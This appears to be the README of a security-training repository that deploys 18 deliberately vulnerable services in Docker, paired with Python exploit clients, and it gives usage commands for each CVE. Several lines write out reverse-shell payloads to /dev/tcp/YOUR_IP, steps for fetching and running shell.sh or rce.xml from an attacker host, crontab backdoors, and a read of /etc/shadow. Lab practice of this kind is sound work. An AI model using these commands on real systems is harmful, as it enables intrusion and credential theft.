# Vulnerable Labs — Security Testing & Exploit Research Platform

[![CI](https://github.com/RiOxFRANKY/Vulnerable_labs/actions/workflows/ci.yml/badge.svg)](https://github.com/RiOxFRANKY/Vulnerable_labs/actions/workflows/ci.yml)

> A collection of **18 intentionally vulnerable environments** organised into **9 VM pairs**, with Docker-based deployment and ready-to-use Python exploit clients for security research, penetration testing practice, and vulnerability reproduction.

---

## Table of Contents

- [System Architecture](#system-architecture)
- [VM Groups](#vm-groups)
- [Lab Catalog](#lab-catalog)
- [Prerequisites](#prerequisites)
- [Quick Start](#quick-start)
- [Detailed Lab Instructions](#detailed-lab-instructions)
- [Server Script Verification](#server-script-verification)
- [DevOps / CI Pipeline](#devops--ci-pipeline)
- [Troubleshooting](#troubleshooting)
- [Disclaimer](#disclaimer)

---

## System Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         HOST MACHINE / VM                               │
│                                                                         │
│  ┌──────────────────┐     ┌──────────────────────────────────────────┐  │
│  │  Python Client    │     │        Docker Engine                     │  │
│  │  (client.py)      │     │                                          │  │
│  │                   │     │  ┌────────────────────────────────────┐  │  │
│  │  ┌─────────────┐  │     │  │     Vulnerable Service Container   │  │  │
│  │  │  requests    │  │HTTP │  │                                    │  │  │
│  │  │  socket      │──┼─────┼──│  ┌──────────┐   ┌──────────────┐  │  │  │
│  │  │  argparse    │  │     │  │  │ Vuln App  │   │  Database /  │  │  │  │
│  │  └─────────────┘  │     │  │  │           │◄──│  Backend     │  │  │  │
│  │                   │     │  │  └──────────┘   └──────────────┘  │  │  │
│  │  Modes:           │     │  └────────────────────────────────────┘  │  │
│  │  - check          │     │                                          │  │
│  │  - exploit        │     └──────────────────────────────────────────┘  │
│  │  - exec / shell   │                                                    │
│  └──────────────────┘                                                    │
└─────────────────────────────────────────────────────────────────────────┘
```

### Repository Layout

```
Vulnerable_labs/
├── README.md                    # Master documentation
├── requirements.txt             # Python dependencies for all clients
├── <service_name>/
│   └── <CVE-ID>/
│       ├── docker-compose.yml   # Spins up the vulnerable environment
│       ├── client.py            # Python exploit script
│       └── README.md            # Original vulnerability documentation
└── ...
```

---

## VM Groups

Labs are pre-grouped into **9 VMs** (2 labs each) by service type. Port assignments within each VM are conflict-free — just `docker compose up -d` both labs simultaneously.

| VM | Theme | Lab 1 | Port | Lab 2 | Port |
|---|---|---|---|---|---|
| **VM 1** | Java App Servers | `tomcat/CVE-2017-12615` | `8080` | `spring/CVE-2022-22965` | `8081` |
| **VM 2** | Java Frameworks | `struts2/s2-045` | `8080` | `weblogic/CVE-2020-14882` | `7001` |
| **VM 3** | CI/CD & Artifacts | `jenkins/CVE-2018-1000861` | `8080` | `nexus/CVE-2019-7238` | `8081` |
| **VM 4** | Search Engines | `elasticsearch/CVE-2015-1427` | `9200` | `solr/CVE-2019-17558` | `8983` |
| **VM 5** | Analytics & Discovery | `kibana/CVE-2019-7609` | `5601` | `nacos/CVE-2021-29441` | `8848` |
| **VM 6** | Messaging & Cache | `activemq/CVE-2016-3088` | `8161` | `redis/4-unacc` | `6379` |
| **VM 7** | CMS Platforms | `drupal/CVE-2018-7600` | `8080` | `wordpress/pwnscriptum` | `8081` |
| **VM 8** | DB Admin & E-commerce | `phpmyadmin/CVE-2018-12613` | `8080` | `magento/2.2-sqli` | `8081` |
| **VM 9** | DevOps Infrastructure | `gitlab/CVE-2021-22205` | `8080` | `docker/unauthorized-rce` | `2375` |

> Within each VM, start both labs with their own `docker compose up -d` from their respective directories. No port remapping needed.

---

## Lab Catalog

### RCE — Direct Output

| # | Service | CVE | Vulnerability | VM | Port |
|---|---|---|---|---|---|
| 1 | **Struts2** | S2-045 / CVE-2017-5638 | OGNL injection via `Content-Type` header | VM 2 | 8080 |
| 2 | **Solr** | CVE-2019-17558 | Velocity template injection via config API | VM 4 | 8983 |
| 3 | **ElasticSearch** | CVE-2015-1427 | Groovy sandbox bypass via script_fields | VM 4 | 9200 |
| 4 | **GitLab** | CVE-2021-22205 | Pre-auth RCE via ExifTool DjVu injection | VM 9 | 8080 |
| 5 | **Drupal** | CVE-2018-7600 | Form API `#post_render` exec (Drupalgeddon 2) | VM 7 | 8080 |
| 6 | **phpMyAdmin** | CVE-2018-12613 | LFI + PHP session injection chain | VM 8 | 8080 |

### RCE — Blind (verify via docker exec)

| # | Service | CVE | Vulnerability | VM | Port |
|---|---|---|---|---|---|
| 7 | **Jenkins** | CVE-2018-1000861 | Groovy meta-programming via checkScript | VM 3 | 8080 |
| 8 | **Nexus** | CVE-2019-7238 | Unauthenticated JEXL expression injection | VM 3 | 8081 |
| 9 | **WordPress** | CVE-2016-10033 | PHPMailer Exim command injection via Host header | VM 7 | 8081 |

### RCE — Webshell Upload

| # | Service | CVE | Vulnerability | VM | Port |
|---|---|---|---|---|---|
| 10 | **Tomcat** | CVE-2017-12615 | PUT method arbitrary file write → JSP webshell | VM 1 | 8080 |
| 11 | **Spring** | CVE-2022-22965 | Spring4Shell data binding → AccessLogValve JSP | VM 1 | 8081 |
| 12 | **ActiveMQ** | CVE-2016-3088 | FileServer PUT/MOVE → crontab or JSP webshell | VM 6 | 8161 |
| 13 | **Kibana** | CVE-2019-7609 | Prototype pollution → NODE_OPTIONS env injection | VM 5 | 5601 |

### RCE — Unauthorized API

| # | Service | CVE | Vulnerability | VM | Port |
|---|---|---|---|---|---|
| 14 | **Docker** | Unauth RCE | Exposed Docker TCP API → privileged container | VM 9 | 2375 |

### SQL Injection

| # | Service | CVE | Vulnerability | VM | Port |
|---|---|---|---|---|---|
| 15 | **Magento** | 2.2-sqli | Boolean-based blind SQLi via `prepareSqlCondition` | VM 8 | 8081 |

### Authentication Bypass

| # | Service | CVE | Vulnerability | VM | Port |
|---|---|---|---|---|---|
| 16 | **Nacos** | CVE-2021-29441 | Auth bypass via `User-Agent: Nacos-Server` header | VM 5 | 8848 |
| 17 | **WebLogic** | CVE-2020-14882/14883 | Path traversal bypass + ShellSession RCE chain | VM 2 | 7001 |
| 18 | **Redis** | 4.x Unauth | No auth → key dump / file write / rogue master RCE | VM 6 | 6379 |

---

## Prerequisites

| Requirement | Minimum Version |
|---|---|
| Docker | 20.10+ |
| Docker Compose | v2.0+ |
| Python | 3.6+ |

```bash
pip install -r requirements.txt
```

---

## Quick Start

```bash
# Clone
git clone https://github.com/RiOxFRANKY/Vulnerable_labs.git
cd Vulnerable_labs

# Install Python deps
pip install -r requirements.txt

# Pick a lab (example: Struts2 S2-045)
cd struts2/s2-045
docker compose up -d

# Run the exploit
python client.py http://localhost:8080 --cmd "id"

# Clean up
docker compose down
```

---

## Detailed Lab Instructions

### VM 1 — Java App Servers

#### Tomcat — CVE-2017-12615 (PUT File Write → Webshell)

**Port:** `8080`

```bash
cd tomcat/CVE-2017-12615
docker compose up -d

python client.py http://localhost:8080 --mode check     # verify PUT is enabled
python client.py http://localhost:8080 --mode exploit   # upload shell.jsp
python client.py http://localhost:8080 --mode exec --cmd "id"
python client.py http://localhost:8080 --mode shell     # interactive shell
```

#### Spring — CVE-2022-22965 (Spring4Shell)

**Port:** `8081`

```bash
cd spring/CVE-2022-22965
docker compose up -d

python client.py http://localhost:8081 --mode exploit   # deploy tomcatwar.jsp
python client.py http://localhost:8081 --mode exec --cmd "id"
python client.py http://localhost:8081 --mode shell
```

---

### VM 2 — Java Frameworks

#### Struts2 — S2-045 / CVE-2017-5638 (OGNL Injection)

**Port:** `8080`

```bash
cd struts2/s2-045
docker compose up -d

python client.py http://localhost:8080 --check-only     # confirm vulnerability
python client.py http://localhost:8080 --cmd "id"       # direct RCE with output
# To get a reverse shell (start a listener on YOUR_IP:8000 first):
python client.py http://localhost:8080 --cmd "bash -c 'bash -i >& /dev/tcp/YOUR_IP/8000 0>&1'"
```

#### WebLogic — CVE-2020-14882/14883 (Pre-Auth Console Bypass + RCE)

**Port:** `7001`  
> Wait **4 minutes** after `docker compose up -d` for the AdminServer to fully start.

```bash
cd weblogic/CVE-2020-14882
docker compose up -d
# wait ~4 minutes

python client.py http://localhost:7001 --mode check                         # verify bypass
python client.py http://localhost:7001 --mode shell-session --cmd "id"      # blind RCE
# To get a reverse shell (Java Runtime.exec restrictions apply, use XML Context mode):
# 1. Create rce.xml with ProcessBuilder to execute bash reverse shell
# 2. Host rce.xml on a Python web server at http://YOUR_IP/rce.xml
# 3. Trigger it to catch the shell on your netcat listener:
python client.py http://localhost:7001 --mode xml-context --xml-url http://YOUR_IP/rce.xml
```

---

### VM 3 — CI/CD & Artifact Management

#### Jenkins — CVE-2018-1000861 (Groovy Meta-Programming RCE)

**Port:** `8080`

```bash
cd jenkins/CVE-2018-1000861
docker compose up -d

python client.py http://localhost:8080/ --cmd "touch /tmp/success"   # blind RCE
python client.py http://localhost:8080/ --shell                      # interactive shell
# verify: docker compose exec jenkins ls /tmp/success
```

#### Nexus — CVE-2019-7238 (JEXL Injection RCE)

**Port:** `8081`

```bash
cd nexus/CVE-2019-7238
docker compose up -d

python client.py http://localhost:8081 --cmd "touch /tmp/success"    # blind RCE
python client.py http://localhost:8081 --shell
# verify: docker compose exec web ls /tmp/success
```

---

### VM 4 — Search Engines

#### ElasticSearch — CVE-2015-1427 (Groovy Sandbox Bypass)

**Port:** `9200`  
> Use `--setup` to create a test index before exploiting (required on a fresh instance).

```bash
cd elasticsearch/CVE-2015-1427
docker compose up -d

python client.py http://localhost:9200 --setup --cmd "id"            # java method (default)
python client.py http://localhost:9200 --setup --method groovy --cmd "id"
python client.py http://localhost:9200 --setup --shell
```

#### Solr — CVE-2019-17558 (Velocity Template Injection)

**Port:** `8983`

```bash
cd solr/CVE-2019-17558
docker compose up -d

python client.py http://localhost:8983 --cmd "id"     # auto-detects core, enables Velocity, executes
python client.py http://localhost:8983 --shell
```

---

### VM 5 — Analytics & Service Discovery

#### Kibana — CVE-2019-7609 (Prototype Pollution → RCE)

**Port:** `5601`  
> Requires `sudo sysctl -w vm.max_map_count=262144` on the host before starting.

```bash
cd kibana/CVE-2019-7609
docker compose up -d
# wait for Kibana to reach HTTP 200 on /api/status (~60s)

python client.py http://localhost:5601 --cmd "/bin/touch /tmp/success"
# Then manually visit http://localhost:5601/app/canvas to trigger Node.js restart
# OR use --trigger to attempt automated Canvas fetch
python client.py http://localhost:5601 --cmd "/bin/touch /tmp/success" --trigger
```

#### Nacos — CVE-2021-29441 (Auth Bypass)

**Port:** `8848`

```bash
cd nacos/CVE-2021-29441
docker compose up -d

python client.py http://localhost:8848 --mode check                                      # confirm bypass
python client.py http://localhost:8848 --mode list-users
python client.py http://localhost:8848 --mode add-user --username hacker --password h4ck3r
python client.py http://localhost:8848 --mode list-configs
python client.py http://localhost:8848 --mode list-services
```

---

### VM 6 — Messaging & Cache

#### ActiveMQ — CVE-2016-3088 (Arbitrary File Write)

**Port:** `8161` (web console) · Default creds: `admin:admin`

```bash
cd activemq/CVE-2016-3088
docker compose up -d

python client.py http://localhost:8161 --mode check
python client.py http://localhost:8161 --mode webshell                          # JSP shell at /api/shell.jsp
# To get a reverse shell via crontab overwrite (yields root shell after 1 min):
# Start a listener on YOUR_PORT, then run:
python client.py http://localhost:8161 --mode crontab --attacker-ip YOUR_IP --attacker-port YOUR_PORT
```

#### Redis — 4.x Unauthorized Access

**Port:** `6379`

```bash
cd redis/4-unacc
docker compose up -d

python client.py 127.0.0.1 --mode check              # verify unauthenticated PING
python client.py 127.0.0.1 --mode keys               # dump all keys
python client.py 127.0.0.1 --mode write              # file-write via CONFIG SET + BGSAVE
# To get a reverse shell via rogue server:
cd n0b0dyCN-redis-rogue-server
python redis-rogue-server.py --rhost 127.0.0.1 --lhost YOUR_IP
# Inside the interactive shell, execute standard bash reverse shell payload to your listener
```

> The rogue server method compiles and injects `exp.so` into memory to achieve RCE without touching the disk.

---

### VM 7 — CMS Platforms

#### Drupal — CVE-2018-7600 (Drupalgeddon 2)

**Port:** `8080`  
> Complete the Drupal install wizard at `http://localhost:8080` (choose **Standard** profile, **SQLite** database) before exploiting.

```bash
cd drupal/CVE-2018-7600
docker compose up -d
# complete install wizard at http://localhost:8080

python client.py http://localhost:8080 --cmd "id"
python client.py http://localhost:8080 --shell
```

#### WordPress — CVE-2016-10033 (PwnScriptum)

**Port:** `8081`

```bash
cd wordpress/pwnscriptum
docker compose up -d

python client.py http://localhost:8081 --mode check
python client.py http://localhost:8081 --mode touch --user admin           # verify blind RCE
# To get a reverse shell:
# 1. Create shell.sh containing: #!/bin/bash \n bash -i >& /dev/tcp/YOUR_IP/8000 0>&1
# 2. Host shell.sh on YOUR_IP port 80 via Python web server
python client.py http://localhost:8081 --mode reverse-shell \
    --shell-url http://YOUR_IP/shell.sh --user admin
```

---

### VM 8 — DB Admin & E-commerce

#### phpMyAdmin — CVE-2018-12613 (LFI → RCE)

**Port:** `8080`  
> Auto-logs in via `auth_type=config`. No manual setup needed.

```bash
cd phpmyadmin/CVE-2018-12613
docker compose up -d

python client.py http://localhost:8080 --mode check              # LFI test with /etc/passwd
python client.py http://localhost:8080 --mode read --file /etc/passwd
python client.py http://localhost:8080 --mode exploit            # SQL inject PHP into session + LFI trigger
python client.py http://localhost:8080 --mode exec --cmd "id"
python client.py http://localhost:8080 --mode shell
```

#### Magento — 2.2 SQL Injection (Boolean Blind)

**Port:** `8081`  
> Complete the Magento install wizard at `http://localhost:8081` (DB host: `mysql`, user/pass: `root`) before exploiting.

```bash
cd magento/2.2-sqli
docker compose up -d
# complete install wizard at http://localhost:8081

python client.py http://localhost:8081 --mode check
python client.py http://localhost:8081 --mode extract --query "SELECT user()"
python client.py http://localhost:8081 --mode extract --query "SELECT database()" --max-length 32
```

---

### VM 9 — DevOps Infrastructure

#### GitLab — CVE-2021-22205 (Pre-Auth RCE via ExifTool)

**Port:** `8080`  
> Wait **~3 minutes** for GitLab to start (HTTP 502 is normal during boot).

```bash
cd gitlab/CVE-2021-22205
docker compose up -d
# wait until http://localhost:8080/users/sign_in returns HTTP 200

python client.py http://localhost:8080 --mode verify               # confirm RCE (runs id)
python client.py http://localhost:8080 --mode exec --cmd "whoami"  # exec with output
python client.py http://localhost:8080 --mode exploit --cmd "touch /tmp/pwned"  # blind
python client.py http://localhost:8080 --mode shell                # interactive shell
```

#### Docker — Unauthorized RCE (Exposed Daemon API)

**Port:** `2375`

```bash
cd docker/unauthorized-rce
docker compose up -d

python client.py http://localhost:2375 --mode check    # confirm unauthenticated access
python client.py http://localhost:2375 --mode info     # list containers and images
python client.py http://localhost:2375 --mode exec --cmd "cat /host/etc/shadow"
python client.py http://localhost:2375 --mode crontab --attacker-ip YOUR_IP
```

---

## Server Script Verification

| Lab | Image | Host Port(s) | Dependencies | Status |
|---|---|---|---|---|
| ActiveMQ | `vulhub/activemq:5.11.1-with-cron` | 8161, 61616 | None | Valid |
| Docker | custom build | 2375 | None (privileged) | Valid |
| Drupal | `vulhub/drupal:8.5.0` | 8080 | None (SQLite) | Valid — needs install wizard |
| ElasticSearch | `vulhub/elasticsearch:1.4.2` | 9200, 9300 | None | Valid — use `--setup` flag |
| GitLab | `vulhub/gitlab:13.10.1` | 8080, 10022 | Redis, PostgreSQL | Valid — allow 3 min startup |
| Jenkins | `vulhub/jenkins:2.138` | 8080, 50000 | None | Valid |
| Kibana | `vulhub/kibana:6.5.4` | 5601 | ElasticSearch 6.8.6 | Valid — needs `vm.max_map_count` |
| Magento | `vulhub/magento:2.2.7` | **8081**, 3306 (internal) | MySQL 5.7 | Valid — needs install wizard |
| Nacos | `vulhub/nacos:1.4.0` | 8848, 5005 | None | Valid |
| Nexus | `vulhub/nexus:3.14.0` | 8081, 5005 | None | Valid |
| phpMyAdmin | `vulhub/phpmyadmin:4.8.1` | 8080 | MySQL 5.5 | Valid |
| Redis | `vulhub/redis:4.0.14` | 6379 | None | Valid |
| Solr | `vulhub/solr:8.2.0` | 8983, 5005 | None | Valid |
| Spring | `vulhub/spring-webmvc:5.3.17` | **8081** | None | Valid |
| Struts2 | `vulhub/struts2:2.3.30` | 8080 | None | Valid |
| Tomcat | custom build | 8080 | None | Valid |
| WebLogic | `vulhub/weblogic:12.2.1.3-2018` | 7001 | None | Valid — allow 4 min startup |
| WordPress | `vulhub/wordpress:4.6` | **8081** | MySQL 5 | Valid |

> **Bold ports** were remapped from their original `8080` to eliminate conflicts within their VM pair.

---

## DevOps / CI Pipeline

A GitHub Actions pipeline ([.github/workflows/ci.yml](.github/workflows/ci.yml)) runs on every push and pull request to `main`.

| Check | Tool | Purpose |
|---|---|---|
| Python lint | `ruff` | Catch real defects in the exploit clients |
| Python syntax | `py_compile` (3.8 + 3.12) | Every client compiles cleanly |
| Compose validation | `docker compose config` | All 18 `docker-compose.yml` files are valid |
| Dockerfile lint | `hadolint` | Custom Dockerfiles have no hard errors |
| Shell lint | `shellcheck` | Entrypoint / helper scripts are clean |
| YAML lint | `yamllint` | Repository-owned YAML is well-formed |
| Secret scan | `gitleaks` | No real secrets committed (demo creds allowlisted) |

```bash
make install   # ruff, yamllint, pre-commit + git hooks
make ci        # run the whole pipeline
```

---

## Troubleshooting

| Issue | Solution |
|---|---|
| Container exits immediately | `docker compose logs <service>` |
| GitLab shows 502 | Normal during boot — wait 3 min, then retry |
| WebLogic auth bypass returns 302 | Not fully started yet — wait 4 min total |
| ElasticSearch returns 0 hits | Run with `--setup` flag to create and refresh the index |
| Kibana exploit doesn't fire | Visit `http://localhost:5601/app/canvas` manually after injection |
| Drupal / Magento exploit fails | Complete the install wizard first |
| Python module not found | `pip install -r requirements.txt` |
| `vm.max_map_count` error | `sudo sysctl -w vm.max_map_count=262144` |
| Redis `exploit` mode fails | Compile `exp.so` from RedisModules-ExecuteCommand first |

---

## Disclaimer

> **FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING PURPOSES ONLY.**
>
> This repository contains intentionally vulnerable applications and exploit code for:
> - Security research and education
> - Authorized penetration testing practice
> - Vulnerability reproduction in isolated environments
>
> Do NOT use these tools against systems you do not own or have explicit authorization to test. Always run labs in an **isolated network environment**.
